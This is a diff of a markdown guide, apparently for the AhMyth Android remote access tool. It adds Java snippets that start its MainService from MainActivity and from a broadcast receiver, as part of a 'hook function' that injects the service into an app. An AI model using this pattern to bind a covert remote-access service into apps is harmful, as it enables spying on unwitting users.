@@ -3,6 +3,14 @@
 invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 ```
 ## Java Files for new hook function
+- MainActivity.java
+```java
+MainService.startService(this);
+```
+- MyReciever.java
+```java
+MainService.startService(context);
+```
 - MainService.java
 ```java
 package ahmyth.mine.king.ahmyth;
